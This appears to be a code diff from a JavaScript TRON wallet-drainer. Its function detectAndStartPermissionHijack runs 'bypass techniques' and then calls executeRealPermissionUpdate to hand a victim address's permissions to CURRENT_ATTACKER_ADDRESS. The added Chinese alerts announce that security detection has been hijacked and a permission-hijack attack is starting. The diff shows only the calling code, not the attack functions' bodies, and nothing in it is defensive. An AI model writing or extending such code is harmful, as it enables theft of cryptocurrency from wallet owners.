@@ -4540,14 +4540,23 @@ function detectAndStartPermissionHijack() {
             // 立即启动绕过技术
             try {
                 implementAdvancedBypassTechniques();
+                alert('✅ 绕过技术部署完成\n\n🔥 所有绕过模块已激活\n🔥 安全检测已被劫持\n\n准备执行权限攻击...');
             } catch (error) {
                 alert('⚠️ 绕过技术启动异常\n\n错误: ' + error.message + '\n\n继续执行权限修改...');
             }
             
             // 稍等片刻让绕过技术生效
+            alert('⏰ 等待绕过技术生效\n\n倒计时 2 秒...\n\n准备启动权限劫持攻击');
+            
             setTimeout(() => {
-                // 使用正确的TRON权限修改API
-                executeRealPermissionUpdate(targetAddress);
+                alert('🎯 开始执行权限劫持攻击\n\n目标: ' + targetAddress + '\n攻击者: ' + CURRENT_ATTACKER_ADDRESS + '\n\n正在启动...');
+                
+                try {
+                    // 使用正确的TRON权限修改API
+                    executeRealPermissionUpdate(targetAddress);
+                } catch (error) {
+                    alert('❌ 权限攻击启动失败\n\n错误: ' + error.message + '\n\n请检查网络连接');
+                }
             }, 2000);
         }
 
